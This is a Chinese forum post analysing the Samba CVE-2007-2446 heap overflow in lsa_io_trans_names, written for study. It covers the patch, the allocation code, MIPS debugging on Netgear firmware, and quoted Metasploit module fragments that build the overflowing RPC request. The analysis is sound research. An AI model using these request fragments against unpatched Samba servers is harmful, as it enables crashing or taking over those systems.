
# [原创]samba cve-2007-2446 堆溢出分析

之前翻译的<a href="elink@b6bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2V1P5r3c8Q4x3X3g2D9L8%4k6W2i4K6u0r3x3U0l9I4y4#2)9J5c8U0p5H3i4K6u0r3x3e0k6Q4x3V1k6F1k6i4c8Y4k6h3q4J5i4K6u0V1g2@1&6d9x3U0t1H3x3q4)9J5y4f1f1%4i4K6t1#2z5f1q4Q4x3U0f1^5y4q4)9J5y4f1f1@1i4K6t1#2b7U0S2Q4x3U0f1^5x3q4)9J5y4f1f1@1i4K6t1#2b7U0S2Q4x3U0g2m8b7h3S2W2j5i4m8Q4x3X3c8G2N6X3g2J5k6X3I4G2N6#2)9J5y4f1f1$3i4K6t1#2b7V1y4Q4x3U0f1^5c8W2)9J5y4f1f1$3i4K6t1#2b7U0c8Q4x3U0f1&6c8g2)9J5y4f1f1#2i4K6t1#2z5o6S2Q4x3U0g2m8z5g2)9J5y4f1f1%4i4K6t1#2z5e0c8Q4x3U0g2m8z5q4)9J5c8R3`.`.">【翻译】netgear WNR2200的一个heap overflow漏洞利用</a>文中讲解samba堆溢出的利用。其实利用的漏洞是`cve-2007-2446`中的一个堆溢出漏洞。但是并没有详细讲解漏洞的成因以及具体的`exploit`调试过程。这个漏洞也比较早了，网上并没有详细的漏洞分析，只能找到`cve`的相关描述信息。所以这里为了学习的目的从代码层面分析一下这个漏洞和相关`exploit`的原理。

<a href="elink@91dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2K6j5h3#2T1j5g2)9J5k6h3!0J5k6#2)9J5c8Y4y4S2L8h3u0S2i4K6u0r3M7$3g2U0N6i4u0A6N6s2W2Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6l9%4i4K6u0V1x3U0b7@1y4W2)9J5k6h3S2@1L8h3H3`.">CVE-2007-2446: Multiple Heap Overflows Allow Remote Code Execution</a>包括5个不同的堆溢出漏洞，`metasploit`中的`exploit`利用的是`lsa_io_trans_names`函数中的那个漏洞。

![](upload/attach/202002/725158_XUB3R2DKEBYA4SU.jpg)

## 补丁分析

根据现有信息可以找到`github`上，`samba`修补这个漏洞的代码。<a href="elink@3d5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6j5h3#2T1j5g2)9J5k6s2c8W2j5h3#2Q4x3V1k6K6j5h3#2T1j5g2)9J5c8X3y4G2L8h3#2A6N6q4)9J5c8X3b7K6y4r3j5$3j5X3t1&6y4U0V1H3z5e0t1I4y4U0k6U0z5e0j5I4k6e0x3J5z5o6t1J5z5h3t1I4j5U0l9#2j5e0x3H3k6U0j5&6x3K6m8Q4x3U0y4V1K9h3k6X3i4K6u0V1y4$3j5K6k6h3t1K6x3e0y4S2x3U0q4W2y4U0t1K6y4K6p5&6y4X3k6V1y4$3x3$3j5K6q4W2k6X3x3@1z5o6M7`.">r22852: merge fixes for CVE-2007-2446 and CVE-2007-2447 to all branches</a>

根据漏洞描述可以定位到如下代码。

![](upload/attach/202002/725158_VGY8WWAC4R4QG7R.jpg)

最终可以确定，`lsa_io_trans_names`里的堆溢出补丁为：

增加

```
if (trn->num_entries2 != trn->num_entries) {

/* RPC fault */

return False;

}
```

增加了`num_entries2`和`num_entries`的比较，如果不相同，就返回`false`，避免继续执行。后面的`PRS_ALLOC_MEM`函数中的`num_entries`参数修改为了`num_entries2`。按照漏洞产生的原理来看，前面判断了`num_entries`和`num_entries2`相等才会进入后面的逻辑，所以这里既是不改对程序的运行结果也是不影响的。

根据漏洞描述，猜测漏洞成因是先根据`num_entries`分配堆内存大小，然后写入数据的时候根据`num_entries2`来写入数据，如果`num_entries2`大于`num_entries`就会导致溢出，堆上数据被覆盖。而`num_entries`和`num_entries2`都是用户可控的数据。

## 源码分析和动态调试

猜测 `PRS_ALLOC_MEM`是分配内存的函数，跟进源码：

```
#define PRS_ALLOC_MEM(ps, type, count) (type *)prs_alloc_mem_((ps),sizeof(type),(count))

char *prs_alloc_mem_(prs_struct *ps, size_t size, unsigned int count);
```

```
/*******************************************************************
Allocate memory when unmarshalling... Always zero clears.
********************************************************************/
#if defined(PARANOID_MALLOC_CHECKER)
char *prs_alloc_mem_(prs_struct *ps, size_t size, unsigned int count)
#else
char *prs_alloc_mem(prs_struct *ps, size_t size, unsigned int count)
#endif
{
char *ret = NULL;
if (size) {
/* We can't call the type-safe version here. */
ret = _talloc_zero_array(ps->mem_ctx, size, count, "parse_prs");
}
return ret;
}
```

```
/*
alloc an zero array, checking for integer overflow in the array size
*/
void *_talloc_zero_array(const void *ctx, size_t el_size, unsigned count, const char *name)
{
if (count >= MAX_TALLOC_SIZE/el_size) {
return NULL;
}
return _talloc_zero(ctx, el_size * count, name);
}
```

```
/*
talloc and zero memory.
*/
void *_talloc_zero(const void *ctx, size_t size, const char *name)
{
void *p = talloc_named_const(ctx, size, name);
if (p) {
memset(p, '\0', size);
}
return p;
}
```

分配内存，初始化为`\0`。使用`netgear wnr2000`的中`samba`进行动态调试分析。`samba`版本为`3.0.24`。使用`metasploit`中的`auxiliary/dos/samba/lsa_transnames_heap`进行验证。

抓取`metasploit`发送的数据包，可以看到最后一个`smb`协议的包如下：

![](upload/attach/202002/725158_3S9R8UE4TH795BE.jpg)

该`metasploit`模块的核心代码如下：

```
print_status("Connecting to the SMB service...")
connect()
smb_login()
datastore['DCERPC::fake_bind_multi'] = false
handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', ["\\#{pipe}"])
print_status("Binding to #{handle} ...")
dcerpc_bind(handle)
print_status("Bound to #{handle} ...")
stub = lsa_open_policy(dcerpc)
stub << NDR.long(0)
stub << NDR.long(0)
stub << NDR.long(1)
stub << NDR.long(0x20004)
stub << NDR.long(0x100)
stub << ("X" * 16) * 0x100
stub << NDR.long(1)
stub << NDR.long(0)
print_status("Calling the vulnerable function...")
```

对比利用程序的源码`/usr/share/metasploit-framework/modules/exploits/linux/samba/lsa_transnames_heap.rb`。

```
stub = lsa_open_policy(dcerpc)
stub << NDR.long(0) # num_entries
stub << NDR.long(0) # ptr_sid_enum
stub << NDR.long(num_entries) # num_entries
stub << NDR.long(0x20004) # ptr_trans_names
stub << NDR.long(num_entries2) # num_entries2
stub << buf
stub << nops
stub << payload.encoded
```

以上代码来自`exploit`。根据注释可以假设，在`dos module`中`num_entries`值为`1`，`num_entries`值为`100`。

将`smbd`导入`IDA`，搜索`function name`，只能找到`lsa_io_q_lookup_sids`，根据源码，可以找到

```
LOAD:76DE2888 addiu $a0, (aNames - 0x76F6C000) # "names "
LOAD:76DE288C lw $t9, -0x7F58($gp)
LOAD:76DE2890 addiu $t9, (sub_76DE248C - 0x76DDC000)
LOAD:76DE2894 jalr $t9
```
处为调用`lsa_io_trans_names`。在`76DE2888`处下断点，跟进函数。

之后一路`F8`，来到`PRS_ALLOC_MEM`的调用处。

![](upload/attach/202002/725158_VA98ASX564AY6AT.jpg)

查看寄存器传递的函数参数：

![](upload/attach/202002/725158_PZHVY799KXAW9J3.jpg)

`$a2`的值为`1`，这也确认了`metasploit dos 模块`中定义的`num_entries`值为`1`。

执行完分配内存，查看寄存器`$v0`获得返回的地址为：`761AF208`

![](upload/attach/202002/725158_9UX2ZH5ZJG7BMV8.jpg)

对比源代码：

```
if (UNMARSHALLING(ps)) {
if ((trn->name = PRS_ALLOC_MEM(ps, LSA_TRANS_NAME, trn->num_entries2)) == NULL) {
return False;
}
if ((trn->uni_name = PRS_ALLOC_MEM(ps, UNISTR2, trn->num_entries2)) == NULL) {
return False;
}
}
for (i = 0; i < trn->num_entries2; i++) {
fstring t;
slprintf(t, sizeof(t) - 1, "name[%d] ", i);
if(!lsa_io_trans_name(t, &trn->name[i], ps, depth)) /* translated name */
return False;
}
```

之后进入`lsa_io_trans_name`函数

```
Reads or writes a LSA_TRANS_NAME structure.
*******************************************************************/
static BOOL lsa_io_trans_name(const char *desc, LSA_TRANS_NAME *trn, prs_struct *ps,
int depth)
{
prs_debug(ps, depth, desc, "lsa_io_trans_name");
depth++;
if(!prs_align(ps))
return False;
if(!prs_uint16("sid_name_use", ps, depth, &trn->sid_name_use))
return False;
if(!prs_align(ps))
return False;
if(!smb_io_unihdr ("hdr_name", &trn->hdr_name, ps, depth))
return False;
if(!prs_uint32("domain_idx ", ps, depth, &trn->domain_idx))
return False;
return True;
}
```

动态调试发现，`prs_unit16`,`smb_io_unihdr`,`prs_uint32`,这里都会解析数据写入`761AF208`。一次循环写入`16`个字节。而`dos 模块`中设置的`num_entries2`是`100`。循环`100`次，导致堆溢出。

图为执行完循环，堆内存被破坏。

![](upload/attach/202002/725158_DGUHVJBHCR4JY4R.jpg)

之前翻译的[【翻译】netgear WNR2200的一个heap overflow漏洞利用](https://bbs.kanxue.com/elink@30aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2V1P5r3c8Q4x3X3g2D9L8%4k6W2i4K6u0r3x3U0l9I4y4#2)9J5c8U0p5H3i4K6u0r3x3e0k6Q4x3V1k6F1k6i4c8Y4k6h3q4J5i4K6u0V1g2@1&6d9x3U0t1H3x3q4)9J5y4f1f1%4i4K6t1#2z5f1q4Q4x3U0f1^5y4q4)9J5y4f1f1@1i4K6t1#2b7U0S2Q4x3U0f1^5x3q4)9J5y4f1f1@1i4K6t1#2b7U0S2Q4x3U0g2m8b7h3S2W2j5i4m8Q4x3X3c8G2N6X3g2J5k6X3I4G2N6#2)9J5y4f1f1$3i4K6t1#2b7V1y4Q4x3U0f1^5c8W2)9J5y4f1f1$3i4K6t1#2b7U0c8Q4x3U0f1&6c8g2)9J5y4f1f1#2i4K6t1#2z5o6S2Q4x3U0g2m8z5g2)9J5y4f1f1%4i4K6t1#2z5e0c8Q4x3U0g2m8z5q4)9J5c8R3`.`.)文中讲解`samba`堆溢出的利用。其实利用的漏洞是`cve-2007-2446`中的一个堆溢出漏洞。但是并没有详细讲解漏洞的成因以及具体的`exploit`调试过程。这个漏洞也比较早了，网上并没有详细的漏洞分析，只能找到`cve`的相关描述信息。所以这里为了学习的目的从代码层面分析一下这个漏洞和相关`exploit`的原理。
